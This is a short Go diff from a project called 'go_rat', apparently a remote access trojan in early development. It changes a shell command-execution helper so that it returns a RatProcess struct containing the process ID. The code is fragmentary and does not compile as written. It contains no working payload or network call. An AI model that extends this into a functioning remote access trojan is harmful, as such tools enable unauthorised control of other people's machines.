@@ -14,6 +14,8 @@ package Intel
 
 import (
 	"fmt"
+	"go_rat/pkg/shared_code/Core"
+	"go_rat/pkg/shared_code/ErrorHandling"
 	"os"
 	"syscall"
 
@@ -21,19 +23,23 @@ import (
 )
 
 //function to execute command in a linux environment
-func exec_command(command_string string, shell_arguments []string) *Command {
+// returns RatProcess struct
+func exec_command(command_string string, shell_arguments []string) *Core.RatProcess {
 	attributes := os.ProcAttr{
 		Dir: "./",
 		// Env not used
 		// File not used
 	}
+
 	herp, derp := os.StartProcess("shell command", shell_arguments, &attributes)
 	if derp != nil {
-		Error_printer(derp, "generic error, fix me plz lol <3!")
-		return false
+		ErrorHandling.Error_printer(derp, "generic error, fix me plz lol <3!")
+		return
 	}
-	herp.Pid
-	return true
+	new_process := Core.RatProcess{
+		Pid: herp.Pid,
+	}
+	return &new_process
 }
 func lolzcopypasta() {
 	fmt.Println("Starting dbus example")
